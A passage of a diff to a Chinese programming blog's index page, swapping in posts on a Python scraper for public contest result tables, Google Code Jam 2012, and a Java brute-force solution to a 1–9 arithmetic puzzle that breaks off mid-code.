@@ -7,7 +7,21 @@
 	<meta name="author" content="dawncold">
 
 	
-	<meta name="description" content="其实挺那啥的，那啥呢？说不出来感受，些须高兴又些须失望。 资格赛10个题，仔细一看才知道是POJ的原题，随便找了10个，有简单到算a+b结果的，也有复杂点用动态规划、解方程组的等等。总之和大多数人一样，比较失望。 虽然ac了10个，现在排名88，不过都直到答案网上有的是，自己找来不就可以了么， &hellip;">
+	<meta name="description" content="这些表格是所有参加比赛的学生成绩单，当然只有省份、学校、准考证、姓名、组别、奖项、是否进入决赛这几个列，我用python写的脚本来抓取，存入了本地的一个excel中，所以除了python环境之外还需要xlwt这个包包：） 1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15 &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -79,18 +93,104 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/30/2012-astar-qualification-match/">
+		<a href="/blog/2012/04/20/grub-table-from-html-using-pything/">
 		
-			2012Astar资格赛</a>
+			抓取一些网页上的表格</a>
 	</h2>
 	<div class="entry-content">
-		<p>其实挺那啥的，那啥呢？说不出来感受，些须高兴又些须失望。</p>
+		<p>这些表格是所有参加比赛的学生成绩单，当然只有省份、学校、准考证、姓名、组别、奖项、是否进入决赛这几个列，我用python写的脚本来抓取，存入了本地的一个excel中，所以除了python环境之外还需要xlwt这个包包：）</p>
 
-<p>资格赛10个题，仔细一看才知道是POJ的原题，随便找了10个，有简单到算a+b结果的，也有复杂点用动态规划、解方程组的等等。总之和大多数人一样，比较失望。</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#/usr/bin/env python</span>
+</span><span class='line'><span class="c">#coding: utf-8</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">urllib2</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">xlwt</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">link_list</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class='line'><span class="n">xls</span> <span class="o">=</span> <span class="n">xlwt</span><span class="o">.</span><span class="n">Workbook</span><span class="p">()</span>
+</span><span class='line'><span class="n">table</span> <span class="o">=</span> <span class="n">xls</span><span class="o">.</span><span class="n">add_sheet</span><span class="p">(</span><span class="s">&quot;main&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">288</span><span class="p">,</span> <span class="mi">318</span><span class="p">):</span>
+</span><span class='line'><span class="n">link_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&quot;http://www.lanqiao.org/Article/ShowArticle.asp?ArticleID=</span><span class="si">%d</span><span class="s">&quot;</span><span class="o">%</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">chinese</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class='line'><span class="n">content</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">link_list</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span><span class='line'><span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">link_list</span><span class="p">:</span>
+</span><span class='line'><span class="k">print</span> <span class="n">link</span>
+</span><span class='line'><span class="k">try</span><span class="p">:</span>
+</span><span class='line'><span class="n">content</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">link</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span class='line'><span class="n">link_list</span> <span class="o">=</span> <span class="n">link_list</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+</span><span class='line'><span class="k">except</span><span class="p">:</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;timeout!&quot;</span>
+</span><span class='line'><span class="k">if</span> <span class="n">link</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">link_list</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
+</span><span class='line'><span class="n">link_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">link</span><span class="p">)</span>
+</span><span class='line'><span class="n">some</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">u&#39;&lt;TR.*?&lt;\/TR&gt;&#39;</span><span class="p">,</span> <span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;gbk&#39;</span><span class="p">,</span> <span class="s">&#39;ignore&#39;</span><span class="p">),</span> <span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)</span>
+</span><span class='line'><span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">some</span><span class="p">:</span>
+</span><span class='line'><span class="n">chinese_value</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">u&#39;(?&lt;=</span><span class="se">\u5b8b\u4f53</span><span class="s">&gt;).*(?=&lt;\/FONT&gt;)&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
+</span><span class='line'><span class="n">chinese</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">chinese_value</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">chinese</span><span class="p">)):</span>
+</span><span class='line'><span class="n">tmp</span> <span class="o">=</span> <span class="n">chinese</span><span class="p">[</span><span class="n">line</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">tmp</span><span class="p">)):</span>
+</span><span class='line'><span class="n">table</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">tmp</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;</span><span class="si">%d</span><span class="s">, </span><span class="si">%d</span><span class="s">, </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">tmp</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">xls</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s">&#39;x.xls&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">link_list</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>虽然ac了10个，现在排名88，不过都直到答案网上有的是，自己找来不就可以了么，这样的资格赛有啥意思，难道这不就是随便让人们来参加的么？</p>
 
-<p>现在一想这和GoogleCodeJam的资格赛相比，真是差别很大，相当的大呀~</p>
+<p>链接抓取超时的时候会自动重新抓取，最终就有了一个叫x.xls的表格。其中有个省的数据有问题，可以在筛选中看到奖项这里面有个垃圾数据项，自己改改吧。</p>
+
+<p>里面的正则表达式耗费了我好久时间！！！不过我还是很欣慰能找到这行：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="err">?</span><span class="o">&lt;=</span>\<span class="n">u5b8b</span>\<span class="n">u4f53</span><span class="o">&gt;</span><span class="p">)</span><span class="o">.*</span><span class="p">(</span><span class="err">?</span><span class="o">=&lt;</span>\<span class="o">/</span><span class="n">FONT</span><span class="o">&gt;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>前面两个unicode是“宋体”，这个得看具体的html代码了，所以这个脚本没什么通用性……</p>
 
 		
 		
@@ -110,11 +210,11 @@
   
 
 
-<time datetime="2012-05-30T12:09:00+08:00" pubdate data-updated="true">May 30<span>th</span>, 2012</time></div>
+<time datetime="2012-04-20T09:34:00+08:00" pubdate data-updated="true">Apr 20<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/astar/'>astar</a>, <a class='category' href='/blog/categories/baidu/'>baidu</a>, <a class='category' href='/blog/categories/gcj/'>gcj</a>, <a class='category' href='/blog/categories/poj/'>poj</a>, <a class='category' href='/blog/categories/zhe-si/'>哲思</a>
+	<a class='category' href='/blog/categories/python/'>python</a>
 
 
 </div>
@@ -126,57 +226,16 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/30/test-the-performace-of-vps-using-unixbench/">
+		<a href="/blog/2012/04/16/google-code-jam-2012/">
 		
-			用UnixBench测试VPS性能</a>
+			Code Jam 2012</a>
 	</h2>
 	<div class="entry-content">
-		<p>本来就想测试一下性能的，不过中途遇到点问题。</p>
+		<p>资格赛已经结束了，还好做出来几个题，现在来看这些题目都不算是特别有难度，最主要的还是在理解题目的要求，这当然对于我们非英语系国家的人来说是有些困难的，可能我们需要多读几遍题目才能开始编码，这确实有些不利，但最主要的还是理解错了题目，这样才可怕。</p>
 
-<p>UnixBench用了perl，但不知道为何我的VPS对perl似乎不太友好，提示有几个关键的moudle找不到，于是无法测试了，根据提示我需要安装Time::HiRes这个module。</p>
+<p>第二个题我就理解有些问题，考虑得太多了，看优秀选手的代码，才十几行结束，真是羡慕死我了！！！</p>
 
-<p>听说perl5之后有了一个module管理器，叫CPAN（C盘？），就和yum这样的工具一样可以随意安装module，确实方便，可以和python的pip啊easy_install这样的工具媲美。</p>
-
-<p>但我在使用CPAN的时候发现连这个module都没有…………于是去CPAN.org这里搜索下载这个基础module，但在makefile的时候（用perl做makefile），发现又缺少一个module，看来这个更加底层。从网上找到方法说用yum进行安装，于是用yum -y install perl-CPAN，这样就能用了：）</p>
-
-<p>在安装Time::HiRes的时候发现找不到install工具………………天啊，又去了CPAN.org下载了这个module的源码，自己编译安装上了，这样就没问题了：）</p>
-
-<p>VPS的得分稍后更新：）</p>
-
-<p>UPDATE:</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">Benchmark Run: 三  5月 30 2012 11:38:34 - 12:06:53
-1 CPU in system; running 1 parallel copy of tests
-
-Dhrystone 2 using register variables       12579232.4 lps   (10.0 s, 7 samples)
-Double-Precision Whetstone                     2268.2 MWIPS (10.3 s, 7 samples)
-Execl Throughput                               1140.1 lps   (29.6 s, 2 samples)
-File Copy 1024 bufsize 2000 maxblocks        270525.4 KBps  (30.0 s, 2 samples)
-File Copy 256 bufsize 500 maxblocks           77911.8 KBps  (30.1 s, 2 samples)
-File Copy 4096 bufsize 8000 maxblocks        709368.9 KBps  (30.0 s, 2 samples)
-Pipe Throughput                              394585.6 lps   (10.0 s, 7 samples)
-Pipe-based Context Switching                  40293.3 lps   (10.0 s, 7 samples)
-Process Creation                               1908.7 lps   (30.0 s, 2 samples)
-Shell Scripts (1 concurrent)                   1539.5 lpm   (60.0 s, 2 samples)
-Shell Scripts (8 concurrent)                    204.1 lpm   (60.1 s, 2 samples)
-System Call Overhead                         525047.2 lps   (10.0 s, 7 samples)
-
-System Benchmarks Index Values               BASELINE       RESULT    INDEX
-Dhrystone 2 using register variables         116700.0   12579232.4   1077.9
-Double-Precision Whetstone                       55.0       2268.2    412.4
-Execl Throughput                                 43.0       1140.1    265.1
-File Copy 1024 bufsize 2000 maxblocks          3960.0     270525.4    683.1
-File Copy 256 bufsize 500 maxblocks            1655.0      77911.8    470.8
-File Copy 4096 bufsize 8000 maxblocks          5800.0     709368.9   1223.0
-Pipe Throughput                               12440.0     394585.6    317.2
-Pipe-based Context Switching                   4000.0      40293.3    100.7
-Process Creation                                126.0       1908.7    151.5
-Shell Scripts (1 concurrent)                     42.4       1539.5    363.1
-Shell Scripts (8 concurrent)                      6.0        204.1    340.2
-System Call Overhead                          15000.0     525047.2    350.0
-                                                                  ========
-System Benchmarks Index Score                                         382.2</pre>
-
+<p>下一轮比赛可能就要在家做了吧？毕竟到了我跑回家的日子：）</p>
 
 		
 		
@@ -196,11 +255,11 @@ System Benchmarks Index Score                                         382.2</pre
   
 
 
-<time datetime="2012-05-30T12:02:00+08:00" pubdate data-updated="true">May 30<span>th</span>, 2012</time></div>
+<time datetime="2012-04-16T13:20:00+08:00" pubdate data-updated="true">Apr 16<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/unixbench/'>UnixBench</a>, <a class='category' href='/blog/categories/perl/'>perl</a>, <a class='category' href='/blog/categories/vps/'>vps</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/google/'>google</a>
 
 
 </div>
@@ -212,20 +271,246 @@ System Benchmarks Index Score                                         382.2</pre
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/23/new-input-method-on-mac-rimeime/">
+		<a href="/blog/2012/04/08/9-numbers-calculate-110/">
 		
-			新的输入法测试</a>
+			9个数运算结果为110</a>
 	</h2>
 	<div class="entry-content">
-		<p>mac下的输入法一直让我耿耿于怀，官方的输入法就不多说了，基本不会去用，虽然UI做得不错，没用几分钟就再也不使用了。</p>
+		<p>昨天参加了一个小型编程比赛，有个题目是这样的，有1～9这九个数字，按照顺序排列着，你可以在他们之间加入加号、减号或者什么都不加，组成的算式经过运算后结果为110的输出出来。</p>
 
-<p>然后使用了搜狗输入法，词汇量真的很大，这个和Windows平台的积累密不可分，但是我使用的时候搜狗输入法for mac的刚刚开始测试，bug比较多，渐渐被QQ输入法赶上了。</p>
+<p>看着好简单的题目，当时比赛时候就是一下子没做出来，现在做好了，贴出来，如果有需要可以拿去用哈，代码风格不算好，因为是比赛嘛，又不是商业项目，先快速得到结果再说！</p>
 
-<p>QQ输入法用了很久，不过偶尔出现打字时候卡死的情况，其他没啥问题，我就以为是我自己的问题吧，刚刚在微博上搜索了一下，不少用户都遇到这样的问题，搜狗那边也是如此，这就很奇怪了。。。</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.util.ArrayList</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">unittest</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>   <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">argStrings</span><span class="o">)</span>
+</span><span class='line'>   <span class="o">{</span>
+</span><span class='line'>       <span class="kt">long</span> <span class="n">start</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
+</span><span class='line'>       <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">allopts</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">a</span><span class="o">,</span><span class="n">b</span><span class="o">,</span><span class="n">c</span><span class="o">,</span><span class="n">d</span><span class="o">,</span><span class="n">e</span><span class="o">,</span><span class="n">f</span><span class="o">,</span><span class="n">g</span><span class="o">,</span><span class="n">h</span><span class="o">;</span>
+</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">a</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">a</span><span class="o">++)</span>
+</span><span class='line'>           <span class="k">for</span><span class="o">(</span><span class="n">b</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">b</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">b</span><span class="o">++)</span>
+</span><span class='line'>               <span class="k">for</span><span class="o">(</span><span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">c</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">c</span><span class="o">++)</span>
+</span><span class='line'>                   <span class="k">for</span><span class="o">(</span><span class="n">d</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">d</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">d</span><span class="o">++)</span>
+</span><span class='line'>                       <span class="k">for</span><span class="o">(</span><span class="n">e</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">e</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">e</span><span class="o">++)</span>
+</span><span class='line'>                           <span class="k">for</span><span class="o">(</span><span class="n">f</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">f</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">f</span><span class="o">++)</span>
+</span><span class='line'>                               <span class="k">for</span><span class="o">(</span><span class="n">g</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">g</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">g</span><span class="o">++)</span>
+</span><span class='line'>                                   <span class="k">for</span><span class="o">(</span><span class="n">h</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">h</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">h</span><span class="o">++)</span> <span class="o">{</span>
+</span><span class='line'>                                       <span class="n">allopts</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&quot;&quot;</span><span class="o">+</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">d</span><span class="o">+</span><span class="n">e</span><span class="o">+</span><span class="n">f</span><span class="o">+</span><span class="n">g</span><span class="o">+</span><span class="n">h</span><span class="o">);</span>
+</span><span class='line'>                                   <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>       <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">string</span> <span class="o">:</span> <span class="n">allopts</span><span class="o">)</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">&quot;1x2x3x4x5x6x7x8x9&quot;</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">string</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span>
+</span><span class='line'>           <span class="o">{</span>
+</span><span class='line'>               <span class="n">String</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">getOpt</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="s">&quot;&quot;</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">)));</span>
+</span><span class='line'>               <span class="n">base</span> <span class="o">=</span> <span class="n">base</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">&quot;x&quot;</span><span class="o">,</span> <span class="n">tmp</span><span class="o">);</span>
+</span><span class='line'>           <span class="o">}</span>
+</span><span class='line'>           <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="n">getResult</span><span class="o">(</span><span class="n">base</span><span class="o">,</span> <span class="n">string</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&quot;2&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&quot;0&quot;</span><span class="o">,</span> <span class="s">&quot;+&quot;</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&quot;1&quot;</span><span class="o">,</span> <span class="s">&quot;-&quot;</span><span class="o">));</span><span class="c1">//2-&gt;null</span>
+</span><span class='line'>           <span class="k">if</span> <span class="o">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">110</span><span class="o">)</span>
+</span><span class='line'>           <span class="o">{</span>
+</span><span class='line'>               <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">base</span><span class="o">);</span>
+</span><span class='line'>           <span class="o">}</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>       <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;All Run Time: &quot;</span> <span class="o">+</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">-</span> <span class="n">start</span><span class="o">)</span> <span class="o">+</span> <span class="s">&quot;ms&quot;</span><span class="o">);</span>
+</span><span class='line'>   <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>   <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">getOpt</span><span class="o">(</span><span class="kt">int</span> <span class="n">opt</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>       <span class="n">String</span> <span class="n">retString</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">;</span>
+</span><span class='line'>       <span class="k">switch</span> <span class="o">(</span><span class="n">opt</span><span class="o">)</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+</span><span class='line'>               <span class="n">retString</span> <span class="o">=</span> <span class="s">&quot;+&quot;</span><span class="o">;</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span><span class='line'>               <span class="n">retString</span> <span class="o">=</span> <span class="s">&quot;-&quot;</span><span class="o">;</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span><span class='line'>               <span class="n">retString</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">;</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">default</span><span class="o">:</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>       <span class="k">return</span> <span class="n">retString</span><span class="o">;</span>
+</span><span class='line'>   <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>   <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="nf">getResult</span><span class="o">(</span><span class="n">String</span> <span class="n">calculatString</span><span class="o">,</span> <span class="n">String</span> <span class="n">optString</span><span class="o">)</span>
+</span><span class='line'>   <span class="o">{</span>
+</span><span class='line'>       <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;</span> <span class="n">allNum</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;();</span>
+</span><span class='line'>       <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">allOpt</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>
+</span><span class='line'>       <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">string</span> <span class="o">:</span> <span class="n">calculatString</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">&quot;[+-]&quot;</span><span class="o">))</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="n">allNum</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">string</span><span class="o">));</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>       <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">optString</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span>
+</span><span class='line'>       <span class="o">{</span>
